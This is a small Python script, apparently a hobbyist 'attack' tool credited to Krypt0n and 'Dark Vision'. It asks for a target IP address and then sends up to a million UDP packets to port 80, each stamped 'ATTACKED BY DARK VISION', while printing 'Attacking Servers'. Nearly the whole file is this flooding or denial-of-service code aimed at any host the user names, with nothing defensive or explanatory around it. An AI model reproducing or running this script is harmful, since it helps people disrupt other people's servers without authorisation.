import socket 
import time
import os




print("===========================================")
print("      ▄██████▄  ████████▄   ▄█    █▄  ")
print("     ███    ███ ███   ▀███ ███    ███ ")
print("     ███    █▀  ███    ███ ███    ███ ")
print("    ▄███        ███    ███ ███    ███ ")
print("   ▀▀███ ████▄  ███    ███ ███    ███ ")
print("     ███    ███ ███    ███ ███    ███ ")
print("     ███    ███ ███   ▄███ ███    ███ ")
print("     ████████▀  ████████▀   ▀██████▀  ")
print("===========================================")
print("              Made By Krypt0n              ")

def send_udp_packet(target_ip, target_port, message):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(message.encode(), (target_ip, target_port))
def main():
    print("===========================================")
    target_ip=input("Enter Target's Ip: ")
    print("===========================================")
    target_port = 80
    message = "ATTACKED BY DARK VISION | MADE BY KRYPT0N"
    for i in range(1000000):
        send_udp_packet(target_ip, target_port, message)
        time.sleep(0.25)
        print("Attacking Servers ... ")
    print("===========================================")
    print("Attack Completed ")
    print("===========================================")
main()
